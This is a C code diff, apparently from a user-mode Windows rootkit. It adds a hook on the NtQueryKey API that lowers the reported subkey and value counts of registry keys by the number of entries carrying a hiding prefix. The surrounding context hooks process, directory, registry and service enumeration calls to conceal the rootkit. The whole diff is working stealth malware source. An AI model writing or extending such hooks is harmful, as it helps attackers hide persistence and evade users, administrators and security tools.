@@ -12,6 +12,7 @@ static NT_NTQUERYSYSTEMINFORMATION OriginalNtQuerySystemInformation;
 static NT_NTRESUMETHREAD OriginalNtResumeThread;
 static NT_NTQUERYDIRECTORYFILE OriginalNtQueryDirectoryFile;
 static NT_NTQUERYDIRECTORYFILEEX OriginalNtQueryDirectoryFileEx;
+static NT_NTQUERYKEY OriginalNtQueryKey;
 static NT_NTENUMERATEKEY OriginalNtEnumerateKey;
 static NT_NTENUMERATEVALUEKEY OriginalNtEnumerateValueKey;
 static NT_ENUMSERVICEGROUPW OriginalEnumServiceGroupW;
@@ -39,6 +40,7 @@ VOID InitializeHooks()
 	InstallHook("ntdll.dll", "NtResumeThread", (LPVOID*)&OriginalNtResumeThread, HookedNtResumeThread);
 	InstallHook("ntdll.dll", "NtQueryDirectoryFile", (LPVOID*)&OriginalNtQueryDirectoryFile, HookedNtQueryDirectoryFile);
 	InstallHook("ntdll.dll", "NtQueryDirectoryFileEx", (LPVOID*)&OriginalNtQueryDirectoryFileEx, HookedNtQueryDirectoryFileEx);
+	InstallHook("ntdll.dll", "NtQueryKey", (LPVOID*)&OriginalNtQueryKey, HookedNtQueryKey);
 	InstallHook("ntdll.dll", "NtEnumerateKey", (LPVOID*)&OriginalNtEnumerateKey, HookedNtEnumerateKey);
 	InstallHook("ntdll.dll", "NtEnumerateValueKey", (LPVOID*)&OriginalNtEnumerateValueKey, HookedNtEnumerateValueKey);
 	InstallHook("advapi32.dll", "EnumServiceGroupW", (LPVOID*)&OriginalEnumServiceGroupW, HookedEnumServiceGroupW);
@@ -73,6 +75,7 @@ VOID UninitializeHooks()
 	UninstallHook(OriginalNtResumeThread, HookedNtResumeThread);
 	UninstallHook(OriginalNtQueryDirectoryFile, HookedNtQueryDirectoryFile);
 	UninstallHook(OriginalNtQueryDirectoryFileEx, HookedNtQueryDirectoryFileEx);
+	UninstallHook(OriginalNtQueryKey, HookedNtQueryKey);
 	UninstallHook(OriginalNtEnumerateKey, HookedNtEnumerateKey);
 	UninstallHook(OriginalNtEnumerateValueKey, HookedNtEnumerateValueKey);
 	UninstallHook(OriginalEnumServiceGroupW, HookedEnumServiceGroupW);
@@ -366,6 +369,51 @@ static NTSTATUS NTAPI HookedNtQueryDirectoryFileEx(HANDLE fileHandle, HANDLE eve
 				current = (LPBYTE)current + nextEntryOffset;
 			}
 			while (nextEntryOffset);
+		}
+	}
+
+	return status;
+}
+static NTSTATUS NTAPI HookedNtQueryKey(HANDLE key, NT_KEY_INFORMATION_CLASS keyInformationClass, LPVOID keyInformation, ULONG length, PULONG resultLength)
+{
+	NTSTATUS status = OriginalNtQueryKey(key, keyInformationClass, keyInformation, length, resultLength);;
+
+	if (NT_SUCCESS(status) && (keyInformationClass == KeyFullInformation || keyInformationClass == KeyCachedInformation))
+	{
+		BYTE buffer[1024];
+		PNT_KEY_BASIC_INFORMATION keyBasicInformation = (PNT_KEY_BASIC_INFORMATION)buffer;
+		PNT_KEY_VALUE_BASIC_INFORMATION keyValueBasicInformation = (PNT_KEY_VALUE_BASIC_INFORMATION)buffer;
+
+		// Count number of hidden subkeys and values.
+		ULONG hiddenSubKeys = 0;
+		ULONG hiddenValues = 0;
+
+		for (ULONG i = 0; OriginalNtEnumerateKey(key, i, KeyBasicInformation, keyBasicInformation, 1024, resultLength) == ERROR_SUCCESS; i++)
+		{
+			if (HasPrefix(keyBasicInformation->Name))
+			{
+				hiddenSubKeys++;
+			}
+		}
+
+		for (ULONG i = 0; OriginalNtEnumerateValueKey(key, i, KeyValueBasicInformation, keyValueBasicInformation, 1024, resultLength) == ERROR_SUCCESS; i++)
+		{
+			if (HasPrefix(keyValueBasicInformation->Name))
+			{
+				hiddenValues++;
+			}
+		}
+
+		// Subtract count by hidden keys and values.
+		if (keyInformationClass == KeyFullInformation)
+		{
+			((PNT_KEY_FULL_INFORMATION)keyInformation)->SubKeys -= hiddenSubKeys;
+			((PNT_KEY_FULL_INFORMATION)keyInformation)->Values -= hiddenValues;
+		}
+		else if (keyInformationClass == KeyCachedInformation)
+		{
+			((PNT_KEY_CACHED_INFORMATION)keyInformation)->SubKeys -= hiddenSubKeys;
+			((PNT_KEY_CACHED_INFORMATION)keyInformation)->Values -= hiddenValues;
 		}
 	}
 
